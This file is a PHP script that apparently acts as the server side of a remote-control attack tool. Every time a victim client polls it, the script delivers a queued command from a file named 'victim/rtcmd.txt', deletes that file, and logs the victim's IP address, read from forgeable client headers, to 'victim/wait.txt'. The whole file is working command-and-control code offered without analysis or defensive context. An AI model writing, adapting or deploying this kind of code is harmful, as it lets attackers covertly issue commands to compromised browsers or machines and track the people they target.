<?php
@header("Content-Type:text/html;charset=utf-8");
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . "GMT");
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");

if (file_exists("victim/rtcmd.txt")){
    $cmd = file_get_contents("victim/rtcmd.txt"); 
    unlink("victim/rtcmd.txt");
    echo $cmd;
} else {
	  echo "";
}
function get_ip()
{
	if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')){
		$onlineip = getenv('HTTP_CLIENT_IP');
		list($onlineip,) = explode(",", $onlineip);
		$_SERVER["REMOTE_ADDR"] = $onlineip;
		}elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')){
		$onlineip = getenv('HTTP_X_FORWARDED_FOR');
		list($onlineip,) = explode(",", $onlineip);
		$_SERVER["REMOTE_ADDR"] = $onlineip;
		}elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')){
		$onlineip = getenv('REMOTE_ADDR');
		list($onlineip,) = explode(",", $onlineip);
		$_SERVER["REMOTE_ADDR"] = $onlineip;
		}elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')){
		$onlineip = $_SERVER['REMOTE_ADDR'];
		list($onlineip,) = explode(",", $onlineip);
		$_SERVER["REMOTE_ADDR"] = $onlineip;
	}
	return $onlineip;
}
$ip = get_ip();
$fp = fopen("victim/wait.txt", "a+");
fwrite($fp, $ip);
fclose($fp);
?>
